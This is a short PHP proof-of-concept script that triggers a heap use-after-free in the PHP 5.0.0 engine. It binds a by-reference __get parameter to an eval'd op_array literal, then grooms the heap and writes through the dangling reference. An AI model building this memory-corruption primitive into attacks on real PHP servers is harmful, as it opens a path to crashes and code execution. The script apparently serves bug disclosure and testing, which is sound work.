<?php
/* 5.0.0 engine-core: zend_std_read_property hands the ENGINE-OWNED property-name
 * zval (for $obj->literal that is &opline->op2.u.constant, i.e. memory inside the
 * op_array opcode block) to userland __get via call_user_function_ex(..., no_separation=0).
 * zend_call_function's by-ref-arg path (Zend/zend_execute_API.c:733-748) skips separation
 * when refcount==1 and instead stamps is_ref=1 + refcount++ on the CALLER's zval.
 * A user-declared by-ref __get parameter therefore binds a live PHP reference straight
 * into the op_array literal.  When that op_array is destroyed (eval'd code), the
 * reference dangles -> heap-use-after-free read/write.
 */
class C { function __get(&$n) { $GLOBALS['keep'] = &$n; return 1; } }
$c = new C;
eval('$c->propname_aaaaaaaaaaaaaaaaaaaaaaaaaaaa;');
$junk = array();
for ($i = 0; $i < 4000; $i++) { $junk[$i] = str_repeat("Q", 24); }
for ($i = 0; $i < 4000; $i++) { $keep = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$i"; }
var_dump($keep);
echo "end\n";
